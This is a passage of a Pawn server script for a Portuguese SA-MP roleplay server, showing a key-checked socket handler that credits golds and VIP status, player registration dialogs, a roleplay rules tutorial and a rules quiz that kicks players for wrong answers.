		        sStats[0][VIPs]++;
		        currentSlots--;
		        
          		socket_sendto_remote_client(id, remote_clientid, "true");
          		socket_close_remote_client(id, remote_clientid);
		    }
		    else
		    {
		        format(string, sizeof(string), "O socket %s [ID: %d] tentou adicionar golds no jogador %s com a key errada!", cIP, remote_clientid, GetPlayerNameEx(found));
		        SocketLog(string);
		        
		        socket_sendto_remote_client(id, remote_clientid, "Access Denied");
		        socket_close_remote_client(id, remote_clientid);
		    }
		}
		else
		{
			new ficheiro[128];

			format(ficheiro, sizeof(ficheiro), "PCRP/Contas/%s.ini", nomeConta);
			
			if(!DOF2_FileExists(ficheiro))
			{
		        format(string, sizeof(string), "O socket %s [ID: %d] tentou adicionar VIP's num jogador que não existe [%s]!", cIP, remote_clientid, nomeConta);
		        SocketLog(string);

		        socket_sendto_remote_client(id, remote_clientid, "Access Denied");
		        socket_close_remote_client(id, remote_clientid);
			}
			else
			{
				new golds = DOF2_GetInt(ficheiro, "Golds");
				
				golds += 20;
			    
			    DOF2_SetInt(ficheiro, "Golds", golds);

			    DOF2_SaveFile();
			    
		        format(string, sizeof(string), "O socket %s [ID: %d] adicionou golds no jogador offline %s!", cIP, remote_clientid, nomeConta);
		        SocketLog(string);
		        
		        sStats[0][VIPs]++;
		        
		        socket_sendto_remote_client(id, remote_clientid, "true");
		        socket_close_remote_client(id, remote_clientid);
			}
		}
	}
	else
	{
 		format(string, sizeof(string), "O socket %s [ID: %d] enviou um comando inexistente: %s!", cIP, remote_clientid, command);
  		SocketLog(string);

		socket_sendto_remote_client(id, remote_clientid, "Access Denied");
  		socket_close_remote_client(id, remote_clientid);
	}
	
	return 1;
}

public OnPlayerDeath(playerid, killerid, reason)
{
    if(killerid != INVALID_PLAYER_ID)
    {
		if(AdminDuty[playerid] == true)
		{
		    KickPlayer(killerid, "Doge", "Matou um Administrador em serviço");
		    return 1;
		}
	}
	
	new Float:x, Float:y, Float:z, VW, Int;

	GetPlayerPos(playerid, x, y, z);
	VW = GetPlayerVirtualWorld(playerid);
	Int = GetPlayerInterior(playerid);

	pInfo[playerid][Morto] = 1;

	pInfo[playerid][MorteX] = x;
	pInfo[playerid][MorteY] = y;
	pInfo[playerid][MorteZ] = z;
	pInfo[playerid][MorteVirtualWorld] = VW;
	pInfo[playerid][MorteInterior] = Int;

	SetTimerEx("Morte", 3500, false, "i", playerid);
	
    return 1;
}

public OnPlayerUpdate(playerid) { return 1; }

public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
	new string[256];
 	new sdialog[1200];
 	
	switch(dialogid)
	{
	    case DIALOG_REGISTER:
	    {
	        if(!response) return KickPlayer(playerid, "Doge", "Não se quis registar");
	        
	        new pw[33];
	        strmid(pw, inputtext, 0, 32);
	        
	        if(strlen(pw) == 0 || strlen(pw) < 3)
			{
		 		format(string, sizeof(string), "{FF9900}[ {FFFFFF}PORTUGAL FUN MAPS {FF9900}]"); strcat(sdialog,string);
		 		format(string, sizeof(string), "\n\n{FF0000}Password inválida.", GetPlayerNameEx(playerid)); strcat(sdialog,string);
		    	format(string, sizeof(string), "\n\n{FFFFFF}Nome da tua conta: {FF9900}%s", GetPlayerNameEx(playerid)); strcat(sdialog,string);
		    	format(string, sizeof(string), "\n{FFFFFF}Status: {AA3333}Não registada"); strcat(sdialog,string);
		        return ShowPlayerDialog(playerid, DIALOG_REGISTER, DIALOG_STYLE_PASSWORD, "REGISTA", sdialog, "Registar", "Sair");
			}

			RegistarJogador(playerid, pw);
			
			return ShowPlayerDialog(playerid, DIALOG_SEXO, DIALOG_STYLE_LIST, "ESCOLHE O TEU SEXO", "{FFFFFF}Masculino\nFeminino", "Escolher", "Sair");
	    }
	    case DIALOG_LOGIN:
	    {
	        if(!response) return KickPlayer(playerid, "Doge", "Não se quis logar");
	        
	        LogarJogador(playerid, inputtext);

	        return 1;
	    }
	    case DIALOG_SEXO:
	    {
	        if(!response) return KickPlayer(playerid, "Doge", "Não quis escolher o sexo.");
	        
	        switch(listitem)
	        {
				case 0:
				{
				    pInfo[playerid][Sexo] = 0;
				}
				case 1:
				{
				    pInfo[playerid][Sexo] = 1;
				}
	        }
	        
	        return ShowPlayerDialog(playerid, DIALOG_IDADE, DIALOG_STYLE_INPUT, "ESCREVE A TUA IDADE", "{FFFFFF}Introduz a tua idade abaixo (18-80).", "Escolher", "Sair");
	    }
	    case DIALOG_IDADE:
	    {
	        if(!response) return KickPlayer(playerid, "Doge", "Não quis escolher a idade.");
	        
	        if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_IDADE, DIALOG_STYLE_INPUT, "ESCREVE A TUA IDADE", "{FF0000}Idade inválida. {FFFFFF}Introduz a tua idade novamente (18-80).", "Escolher", "Sair");
	        
			new idade = strval(inputtext);
			
			if(idade < 18 || idade > 80) return ShowPlayerDialog(playerid, DIALOG_IDADE, DIALOG_STYLE_INPUT, "ESCREVE A TUA IDADE", "{FF0000}Idade inválida. {FFFFFF}Introduz a tua idade novamente (18-80).", "Escolher", "Sair");
			
			pInfo[playerid][Idade] = idade;
			
			format(string, sizeof(string), "{FFFFFF}%s", SpawnInfo[0][Nome]);
			return ShowPlayerDialog(playerid, DIALOG_ORIGEM, DIALOG_STYLE_LIST, "ESCOLHE A TUA NATURALIDADE", string, "Escolher", "Sair");
	    }
	    case DIALOG_ORIGEM:
	    {
	        if(!response) return KickPlayer(playerid, "Doge", "Não quis escolher a naturalidade.");
	        
	        switch(listitem)
	        {
	            case 0:
	            {
					pInfo[playerid][Origem] = 0;
	            }
	            case 1:
	            {
	                pInfo[playerid][Origem] = 1;
	            }
	            case 2:
	            {
	                pInfo[playerid][Origem] = 2;
	            }
	        }

			format(string, sizeof(string), "{FFFFFF}Este servidor consiste em imitar a vida real ao máximo. Para isso precisas de fazer tudo o que normalmente uma pessoa"); strcat(sdialog,string);
			format(string, sizeof(string), "\n{FFFFFF}normal faz. Tal como um cidadão normal e com pleno juízo, terés de trabalhar para te sustentares. Tens ao teu alcance várias maneiras de ganhar"); strcat(sdialog,string);
			format(string, sizeof(string), "\n{FFFFFF}dinheiro, desde trabalhos até às Factions (legais ou ilegais). Com este dinheiro que futuramente ganharás, poderás adquirir carros, casas,"); strcat(sdialog,string);
			format(string, sizeof(string), "\n{FFFFFF}bens materiais, ir a festas e fazer tudo aquilo que te apetecer, respeitando sempre as regras do bom funcionamento do servidor."); strcat(sdialog,string);
			format(string, sizeof(string), "\n{FFFFFF}Mas lembra-te, tudo aquilo que não podes fazer na vida real também não podes fazer dentro do nosso servidor."); strcat(sdialog,string);
			format(string, sizeof(string), "\n{FFFFFF}Este é um pormenor importante do qual te deves sempre lembrar."); strcat(sdialog,string);
		    
		    KillTimer(TimerUnlockTutorial[playerid]);
		    UnlockTutorial[playerid] = false;
		    TimerUnlockTutorial[playerid] = SetTimerEx("UnlockTutorials", 10000, false, "i", playerid);
		    
	        return ShowPlayerDialog(playerid, DIALOG_TUTORIAL1, DIALOG_STYLE_MSGBOX, "TUTORIAL - Em que consiste o servidor", sdialog, "Próximo", "Sair");
	    }
	    case DIALOG_TUTORIAL1:
	    {
	        if(!response) return KickPlayer(playerid, "Doge", "Não quis ver o tutorial.");
	        if(UnlockTutorial[playerid] == false)
	        {
				format(string, sizeof(string), "{FFFFFF}Este servidor consiste em imitar a vida real ao máximo. Para isso precisas de fazer tudo o que normalmente uma pessoa"); strcat(sdialog,string);
				format(string, sizeof(string), "\n{FFFFFF}normal faz. Tal como um cidadão normal e com pleno juízo, terés de trabalhar para te sustentares. Tens ao teu alcance várias maneiras de ganhar"); strcat(sdialog,string);
				format(string, sizeof(string), "\n{FFFFFF}dinheiro, desde trabalhos até ás Factions (legais ou ilegais). Com este dinheiro que futuramente ganharás, poderás adquirir carros, casas,"); strcat(sdialog,string);
				format(string, sizeof(string), "\n{FFFFFF}bens materiais, ir a festas e fazer tudo aquilo que te apetecer, respeitando sempre as regras do bom funcionamento do servidor."); strcat(sdialog,string);
				format(string, sizeof(string), "\n{FFFFFF}Mas lembra-te, tudo aquilo que não podes fazer na vida real também não podes fazer dentro do nosso servidor."); strcat(sdialog,string);
				format(string, sizeof(string), "\n{FFFFFF}Este é um pormenor importante do qual te deves sempre lembrar."); strcat(sdialog,string);

		        return ShowPlayerDialog(playerid, DIALOG_TUTORIAL1, DIALOG_STYLE_MSGBOX, "TUTORIAL - Em que consiste o servidor", sdialog, "Próximo", "Sair");
	        }

			format(string, sizeof(string), "{FFFFFF}O comando {99FF00}/me {FFFFFF}sé é necessário caso a ação que o jogador quer desempenhar não possa ser feita no jogo."); strcat(sdialog,string);
			format(string, sizeof(string), "\n{FFFFFF}Exemplo: Se quiser apontar uma arma, deixa de ser necessário (ou seja, é um RP opcional) fazer o {99FF00}/me aponta a arma {FFFFFF}pois o GTA tem animação para isso."); strcat(sdialog,string);
			format(string, sizeof(string), "\n{FFFFFF}{99FF00}/tentar {FFFFFF}- Usar uma única vez. Caso falhe, tem de desistir da ação ou encontrar outra maneira de a executar sem prejudicar o RP"); strcat(sdialog,string);
			format(string, sizeof(string), "\n{FFFFFF}de outros intrevinientes e arcar com as consquências do falhanço."); strcat(sdialog,string);
			format(string, sizeof(string), "\n{FFFFFF}O comando {99FF00}/do {FFFFFF}é um auxiliar do RP. Serve para expressar emoções ou indicar que em IC estaria lá mas não o conseguimos ver no jogo."); strcat(sdialog,string);
			format(string, sizeof(string), "\n{FFFFFF}Por exemplo, {99FF00}/do desmaiado {FFFFFF}para indicar que se está desmaiado."); strcat(sdialog,string);

			KillTimer(TimerUnlockTutorial[playerid]);
            UnlockTutorial[playerid] = false;
            TimerUnlockTutorial[playerid] = SetTimerEx("UnlockTutorials", 10000, false, "i", playerid);

			return ShowPlayerDialog(playerid, DIALOG_TUTORIAL2, DIALOG_STYLE_MSGBOX, "TUTORIAL - Regras", sdialog, "Próximo", "Sair");
	    }
	    case DIALOG_TUTORIAL2:
	    {
	        if(!response) return KickPlayer(playerid, "Doge", "Não quis ver o tutorial.");
	        if(UnlockTutorial[playerid] == false)
	        {
				format(string, sizeof(string), "{FFFFFF}O comando {99FF00}/me {FFFFFF}sé é necessário caso a ação que o jogador quer desempenhar não possa ser feita no jogo."); strcat(sdialog,string);
				format(string, sizeof(string), "\n{FFFFFF}Exemplo: Se quiser apontar uma arma, deixa de ser necessário (necessário não significa proibído) fazer o {99FF00}/me aponta a arma {FFFFFF}pois o GTA tem animação para isso."); strcat(sdialog,string);
				format(string, sizeof(string), "\n{FFFFFF}{99FF00}/tentar {FFFFFF}- Usar uma única vez. Caso falhe, tem de desistir da ação ou encontrar outra maneira de a executar sem prejudicar o RP"); strcat(sdialog,string);
				format(string, sizeof(string), "\n{FFFFFF}de outros intrevinientes e arcar com as consquências do falhanço."); strcat(sdialog,string);
				format(string, sizeof(string), "\n{FFFFFF}O comando {99FF00}/do {FFFFFF}é um auxiliar do RP. Serve para expressar pensamentos ou indicar que em IC estaria lá mas não o conseguimos ver no jogo."); strcat(sdialog,string);
				format(string, sizeof(string), "\n{FFFFFF}Por exemplo, {99FF00}/do desmaiado {FFFFFF}para indicar que se está desmaiado."); strcat(sdialog,string);

				return ShowPlayerDialog(playerid, DIALOG_TUTORIAL2, DIALOG_STYLE_MSGBOX, "TUTORIAL - Regras", sdialog, "Próximo", "Sair");
	        }
	        
			format(string, sizeof(string), "{FFFFFF}Existem 2 tipos de chats. O chat {99FF00}IC (In-Character) {FFFFFF}é quando é a tua personagem a 'falar'. Neste chat não é permitido"); strcat(sdialog,string);
			format(string, sizeof(string), "\n{FFFFFF}o uso de acrónimos e não é permitido o uso de: OMG, LOL, pq, n, e smilies como :) :( :D xD"); strcat(sdialog,string);
			format(string, sizeof(string), "\n{FFFFFF}O chat {99FF00}OOC (Out-Of-Character) {FFFFFF}é o jogador que está a controlar a personagem a falar. Por sua vez, insultos/ameaças são puníveis com Ban."); strcat(sdialog,string);
			
			KillTimer(TimerUnlockTutorial[playerid]);
            UnlockTutorial[playerid] = false;
            TimerUnlockTutorial[playerid] = SetTimerEx("UnlockTutorials", 10000, false, "i", playerid);

			return ShowPlayerDialog(playerid, DIALOG_TUTORIAL3, DIALOG_STYLE_MSGBOX, "TUTORIAL - Chats", sdialog, "Próximo", "Sair");
	        
	    }
	    case DIALOG_TUTORIAL3:
	    {
	        if(!response) return KickPlayer(playerid, "Doge", "Não quis ver o tutorial.");
	        if(UnlockTutorial[playerid] == false)
	        {
				format(string, sizeof(string), "{FFFFFF}Existem 2 tipos de chats. O chat {99FF00}IC (In-Character) {FFFFFF}é quando é a tua personagem a 'falar'. Neste chat não é permitido"); strcat(sdialog,string);
				format(string, sizeof(string), "\n{FFFFFF}o uso de acrénimos e não é permitido o uso de: OMG, LOL, pq, n, e smilies como :) :( :D xD"); strcat(sdialog,string);
				format(string, sizeof(string), "\n{FFFFFF}O chat OOC é o jogador que está a controlar a personagem a falar. Por sua vez, insultos/ameaças são puníveis com Ban."); strcat(sdialog,string);

				return ShowPlayerDialog(playerid, DIALOG_TUTORIAL3, DIALOG_STYLE_MSGBOX, "TUTORIAL - Chats", sdialog, "Próximo", "Sair");
	        }
	        
			format(string, sizeof(string), "{99FF00}Metagaming: {FFFFFF}Usar conhecimentos OOC em IC"); strcat(sdialog,string);
			format(string, sizeof(string), "\n{99FF00}Powergaming: {FFFFFF}Ações que não podem ser feitas na vida real; Forçar o roleplay sem dar chance a outras personagens de se 'defenderem'"); strcat(sdialog,string);
			format(string, sizeof(string), "\n{FFFFFF}Tomar decisões/praticar atos que apenas beneficiem a tua personagem"); strcat(sdialog,string);
			format(string, sizeof(string), "\n{99FF00}Deathmatch: {FFFFFF}Matar outra personagem sem razão IC e sem divulgar a razão"); strcat(sdialog,string);
			format(string, sizeof(string), "\n{99FF00}Bunnyhop: {FFFFFF}Saltar para chegar mais rápido a algum lado"); strcat(sdialog,string);
			format(string, sizeof(string), "\n{99FF00}Revenge-Kill: {FFFFFF}Matar outra pessoa por ela te ter morto a ti."); strcat(sdialog,string);
			format(string, sizeof(string), "\n{99FF00}Atenção: Quando uma personagem fica gravemente ferida e vai para o hospital, c/ ou sem"); strcat(sdialog,string);
			format(string, sizeof(string), "\n{99FF00}médicos, automaticamente vai esquecer os 15 minutos anteriores."); strcat(sdialog,string);

            KillTimer(TimerUnlockTutorial[playerid]);
            UnlockTutorial[playerid] = false;
            TimerUnlockTutorial[playerid] = SetTimerEx("UnlockTutorials", 10000, false, "i", playerid);

			return ShowPlayerDialog(playerid, DIALOG_TUTORIAL4, DIALOG_STYLE_MSGBOX, "TUTORIAL - Tipos de Non-RP", sdialog, "Próximo", "Sair");
	    }
	    case DIALOG_TUTORIAL4:
	    {
	        if(!response) return KickPlayer(playerid, "Doge", "Não quis aceitar as regras.");
	        if(UnlockTutorial[playerid] == false)
	        {
				format(string, sizeof(string), "{99FF00}Metagaming: {FFFFFF}Usar conhecimentos OOC em IC"); strcat(sdialog,string);
				format(string, sizeof(string), "\n{99FF00}Powergaming: {FFFFFF}Ações que não podem ser feitas na vida real; Forçar o roleplay sem dar chance a outras personagens de se 'defenderem'"); strcat(sdialog,string);
				format(string, sizeof(string), "\n{FFFFFF}Tomar decisões/praticar atos que apenas beneficiem a tua personagem"); strcat(sdialog,string);
				format(string, sizeof(string), "\n{99FF00}Deathmatch: {FFFFFF}Matar outra personagem sem razão IC e sem divulgar a razão"); strcat(sdialog,string);
				format(string, sizeof(string), "\n{99FF00}Bunnyhop: {FFFFFF}Saltar para chegar mais rápido a algum lado"); strcat(sdialog,string);
				format(string, sizeof(string), "\n{99FF00}Revenge-Kill: {FFFFFF}Matar outra pessoa por ela te ter morto a ti."); strcat(sdialog,string);
				format(string, sizeof(string), "\n{99FF00}Atenção: Quando uma personagem fica gravemente ferida e vai para o hospital, c/ ou sem"); strcat(sdialog,string);
				format(string, sizeof(string), "\n{99FF00}médicos, automaticamente vai esquecer os 15 minutos anteriores."); strcat(sdialog,string);

				return ShowPlayerDialog(playerid, DIALOG_TUTORIAL4, DIALOG_STYLE_MSGBOX, "TUTORIAL - Tipos de Non-RP", sdialog, "Próximo", "Sair");
	        }

			format(string, sizeof(string), "{FFFFFF}Todas as regras estão na integra no nosso fórum: portugalfunmaps.pt."); strcat(sdialog,string);
			format(string, sizeof(string), "\n{FFFFFF}Irás agora para um questionário para testares o teu conhecimento de Roleplay."); strcat(sdialog,string);
   			format(string, sizeof(string), "\n{FFFFFF}Esperemos que gostes do servidor."); strcat(sdialog,string);
   			format(string, sizeof(string), "\n\n\n{FF0000}Ao jogares neste servidor, estás a concordar com {99FF00}TODAS {FF0000}as regras e {99FF00}aceitas {FF0000}ser punido se as quebrares."); strcat(sdialog,string);
            format(string, sizeof(string), "\n{FFFFFF}Todas as regras englobam as regras presentes no tutorial e no tópico oficial no fórum."); strcat(sdialog,string);

            KillTimer(TimerUnlockTutorial[playerid]);
            UnlockTutorial[playerid] = false;
            TimerUnlockTutorial[playerid] = SetTimerEx("UnlockTutorials", 10000, false, "i", playerid);

			return ShowPlayerDialog(playerid, DIALOG_TUTORIAL5, DIALOG_STYLE_MSGBOX, "TUTORIAL - Últimas Informações", sdialog, "Aceito", "Sair");
	    }
	    case DIALOG_TUTORIAL5:
	    {
	        if(!response) return KickPlayer(playerid, "Doge", "Não quis ver o tutorial.");
	        if(UnlockTutorial[playerid] == false)
	        {
				format(string, sizeof(string), "{FFFFFF}Todas as regras estão na integra no nosso fórum: portugalfunmaps.pt."); strcat(sdialog,string);
				format(string, sizeof(string), "\n{FFFFFF}Irás agora para um questionário para testares o teu conhecimento de Roleplay. Lê-o com MUITA atenção."); strcat(sdialog,string);
	            format(string, sizeof(string), "\n{FFFFFF}Esperemos que gostes do servidor."); strcat(sdialog,string);
	            format(string, sizeof(string), "\n\n\n{FF0000}Ao jogares neste servidor, estás a concordar com {99FF00}TODAS {FF0000}as regras e {99FF00}aceitas {FF0000}ser punido se as quebrares."); strcat(sdialog,string);
                format(string, sizeof(string), "\n{FFFFFF}Todas as regras englobam as regras presentes no tutorial e no tópico oficial no fórum."); strcat(sdialog,string);

				return ShowPlayerDialog(playerid, DIALOG_TUTORIAL5, DIALOG_STYLE_MSGBOX, "TUTORIAL - Últimas Informações", sdialog, "Aceito", "Sair");
	        }
	        
			format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}O Roleplay é o modo de jogo onde:"); strcat(sdialog,string);
			format(string, sizeof(string), "\n{FF9900}As pessoas seguem um conjunto de regras e tentam fazer o que acham mais correto"); strcat(sdialog,string);
			format(string, sizeof(string), "\n{FF9900}Os jogadores tentam fazer algo contrário às situações da vida quotidiana"); strcat(sdialog,string);
			format(string, sizeof(string), "\n{FF9900}Os jogadores tentam com a sua personagem representar o dia a dia de uma pessoa, seguindo regras."); strcat(sdialog,string);
			format(string, sizeof(string), "\n{FF9900}Todos fazem os possíveis para representar a vida não quotidiana."); strcat(sdialog,string);

			return ShowPlayerDialog(playerid, DIALOG_QUESTIONARIO1, DIALOG_STYLE_LIST, "QUESTIONÁRIO", sdialog, "Selecionar", "Sair");
	    }
	    case DIALOG_QUESTIONARIO1:
	    {
	        if(!response) return KickPlayer(playerid, "Doge", "Não quis responder ao questionário.");
	        
	        switch(listitem)
	        {
	            case 0:
	            {
					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}O Roleplay é o modo de jogo onde:"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}As pessoas seguem um conjunto de regras e tentam fazer o que acham mais correto"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Os jogadores tentam fazer algo contrário ás situações da vida quotidiana"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Os jogadores tentam com a sua personagem representar o dia a dia de uma pessoa, seguindo regras."); strcat(sdialog,string); //
					format(string, sizeof(string), "\n{FF9900}Todos fazem os possíveis para representar a vida não quotidiana."); strcat(sdialog,string);

					return ShowPlayerDialog(playerid, DIALOG_QUESTIONARIO1, DIALOG_STYLE_LIST, "QUESTIONÁRIO", sdialog, "Selecionar", "Sair");
	            }
	            case 1:
	            {
	                pInfo[playerid][TutFalhado]++; KickPlayer(playerid, "Doge", "Errou no questionário."); return 1;
	            }
	            case 2:
	            {
	                pInfo[playerid][TutFalhado]++; KickPlayer(playerid, "Doge", "Errou no questionário."); return 1;
	            }
	            case 3: // certa
	            {
					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Qual é o conceito que não é verdadeiro?"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}DeathMatch - Matar alguém por me ter morto a mim"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Metagaming - Usar conhecimentos IC em OOC "); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}PowerGaming - Fazer algo que não seria humanamente possível na vida real"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Os dois primeiros conceitos"); strcat(sdialog,string);

					return ShowPlayerDialog(playerid, DIALOG_QUESTIONARIO2, DIALOG_STYLE_LIST, "QUESTIONÁRIO", sdialog, "Selecionar", "Sair");
	            }
	            case 4:
	            {
	                pInfo[playerid][TutFalhado]++; KickPlayer(playerid, "Doge", "Errou no questionário."); return 1;
	            }
	        }
	    }
	    case DIALOG_QUESTIONARIO2:
		{
	        if(!response) return KickPlayer(playerid, "Doge", "Não quis responder ao questionário.");
	        
	        switch(listitem)
			{
			    case 0:
				{
					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Qual é o conceito que não é verdadeiro?"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}DeathMatch - Matar alguém por me ter morto a mim"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Metagaming - Usar conhecimentos IC em OOC"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}PowerGaming - Fazer algo que não seria humanamente possível na vida real"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Os dois primeiros conceitos"); strcat(sdialog,string);

					return ShowPlayerDialog(playerid, DIALOG_QUESTIONARIO2, DIALOG_STYLE_LIST, "QUESTIONÁRIO", sdialog, "Selecionar", "Sair");
				}
				case 1:
				{
                    pInfo[playerid][TutFalhado]++; KickPlayer(playerid, "Doge", "Errou no questionário."); return 1;
				}
				case 2:
				{
                    pInfo[playerid][TutFalhado]++; KickPlayer(playerid, "Doge", "Errou no questionário."); return 1;
				}
				case 3:
				{
				    pInfo[playerid][TutFalhado]++; KickPlayer(playerid, "Doge", "Errou no questionário."); return 1;
				}
				case 4: // certa
				{
					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Se alguém fizer DeathMatch o que lhe devia acontecer?"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Levar Admin Jail por bater no jogador"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Não lhe devia acontecer nada"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Ser preso pela polícia por agressão a um civil"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Levar Admin Jail por matar um player sem o devido RP"); strcat(sdialog,string); //

					return ShowPlayerDialog(playerid, DIALOG_QUESTIONARIO3, DIALOG_STYLE_LIST, "QUESTIONÁRIO", sdialog, "Selecionar", "Sair");
				}
			}
		}
		case DIALOG_QUESTIONARIO3:
		{
		    if(!response) return KickPlayer(playerid, "Doge", "Não quis responder ao questionário.");
		    
		    switch(listitem)
		    {
		        case 0:
		        {
					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Se alguém fizer DeathMatch o que lhe devia acontecer?"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Levar Admin Jail por bater no jogador"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Não lhe devia acontecer nada"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Ser preso pela polícia por agressão a um civil"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Levar Admin Jail por matar um player sem o devido RP"); strcat(sdialog,string);

					return ShowPlayerDialog(playerid, DIALOG_QUESTIONARIO3, DIALOG_STYLE_LIST, "QUESTIONÁRIO", sdialog, "Selecionar", "Sair");
		        }
		        case 1:
		        {
				    pInfo[playerid][TutFalhado]++; KickPlayer(playerid, "Doge", "Errou no questionário."); return 1;
		        }
		        case 2:
		        {
				    pInfo[playerid][TutFalhado]++; KickPlayer(playerid, "Doge", "Errou no questionário."); return 1;
		        }
		        case 3:
		        {
				    pInfo[playerid][TutFalhado]++; KickPlayer(playerid, "Doge", "Errou no questionário."); return 1;
				}
				case 4: // certa
				{
					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Se alguém não fizer RP contigo após um acidente, o que deverás fazer?"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Spamar um Admin com PM's a dizer NON-RP"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Ir atrás dele e estragar-lhe a viatura"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Seguir com o meu jogo como se nada tivesse acontecido"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Acabar o meu RP e de seguida reportar o jogador no fórum com as devidas provas"); strcat(sdialog,string); //

					return ShowPlayerDialog(playerid, DIALOG_QUESTIONARIO4, DIALOG_STYLE_LIST, "QUESTIONÁRIO", sdialog, "Selecionar", "Sair");
				}
		    }
		}
		case DIALOG_QUESTIONARIO4:
		{
		    if(!response) return KickPlayer(playerid, "Doge", "Não quis responder ao questionário.");

		    switch(listitem)
		    {
		        case 0:
		        {
					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Se alguém não fizer RP contigo após um acidente, o que deverás fazer?"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Spamar um Admin com PM's a dizer NON-RP"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Ir atrás dele e estragar-lhe a viatura"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Seguir com o meu jogo como se nada tivesse acontecido"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Acabar o meu RP e de seguida reportar o jogador no fórum com as devidas provas"); strcat(sdialog,string);

					return ShowPlayerDialog(playerid, DIALOG_QUESTIONARIO4, DIALOG_STYLE_LIST, "QUESTIONÁRIO", sdialog, "Selecionar", "Sair");
		        }
		        case 1:
		        {
				    pInfo[playerid][TutFalhado]++; KickPlayer(playerid, "Doge", "Errou no questionário."); return 1;
		        }
		        case 2:
		        {
				    pInfo[playerid][TutFalhado]++; KickPlayer(playerid, "Doge", "Errou no questionário."); return 1;
		        }
		        case 3:
		        {
				    pInfo[playerid][TutFalhado]++; KickPlayer(playerid, "Doge", "Errou no questionário."); return 1;
				}
				case 4: // certa
				{
					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Se estiveres a meio de um RP e precisares de sair, o que deves fazer?"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Sair sem dar nenhuma explicação"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Explicar ao(s) jogador(es) e à staff a razão da minha saída para evitar problemas"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Dizer que preciso de sair e abandonar o jogo"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Nenhuma das alineas anteriores"); strcat(sdialog,string);

					return ShowPlayerDialog(playerid, DIALOG_QUESTIONARIO5, DIALOG_STYLE_LIST, "QUESTIONÁRIO", sdialog, "Selecionar", "Sair");
				}
		    }
		}
		case DIALOG_QUESTIONARIO5:
		{
		    if(!response) return KickPlayer(playerid, "Doge", "Não quis responder ao questionário.");

		    switch(listitem)
		    {
		        case 0:
		        {
					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Se estiveres a meio de um RP e precisares de sair, o que deves fazer?"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Sair sem dar nenhuma explicação"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Explicar ao(s) jogador(es) e à staff a razão da minha saída para evitar problemas"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Dizer que preciso de sair e abandonar o jogo"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Nenhuma das alineas anteriores"); strcat(sdialog,string);

					return ShowPlayerDialog(playerid, DIALOG_QUESTIONARIO5, DIALOG_STYLE_LIST, "QUESTIONÁRIO", sdialog, "Selecionar", "Sair");
		        }
		        case 1:
		        {
				    pInfo[playerid][TutFalhado]++; KickPlayer(playerid, "Doge", "Errou no questionário."); return 1;
		        }
		        case 2:
		        {
					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Se os teus amigos te pedirem boleia pelo TeamSpeak, o que deverás fazer?"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Devo não lhe dar boleia, porque é contra as regras"); strcat(sdialog,string); //
					format(string, sizeof(string), "\n{FF9900}Ir o mais rápido possível"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Devo reportá-lo no forum"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Todas as alineas são válidas"); strcat(sdialog,string);

					return ShowPlayerDialog(playerid, DIALOG_QUESTIONARIO6, DIALOG_STYLE_LIST, "QUESTIONÁRIO", sdialog, "Selecionar", "Sair");
		        }
		        case 3:
		        {
				    pInfo[playerid][TutFalhado]++; KickPlayer(playerid, "Doge", "Errou no questionário."); return 1;
				}
				case 4: // certa
				{
				    pInfo[playerid][TutFalhado]++; KickPlayer(playerid, "Doge", "Errou no questionário."); return 1;
				}
		    }
		}
		case DIALOG_QUESTIONARIO6:
		{
